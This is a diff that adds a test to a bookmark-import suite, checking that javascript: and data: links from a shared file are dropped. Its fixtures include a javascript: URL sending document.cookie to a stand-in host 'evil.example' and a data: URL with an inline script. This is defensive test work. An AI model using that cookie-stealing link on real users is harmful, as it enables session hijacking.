@@ -180,6 +180,15 @@ describe("bookmark import", () => {
       expect(plan.duplicate).toBe(1);
     });
 
+    it("drops javascript: and data: links from a shared file", () => {
+      const plan = planBookmarkImport([], [
+        { title: "Prize", url: "javascript:fetch('//evil.example?c='+document.cookie)" },
+        { title: "Page", url: "data:text/html,<script>alert(1)</script>" },
+        { title: "Real", url: "https://real.example" },
+      ]);
+      expect(plan.additions.map((b) => b.url)).toEqual(["https://real.example"]);
+    });
+
     it("dedupes within the file too", () => {
       const plan = planBookmarkImport([], [
         { title: "One", url: "https://same.example" },
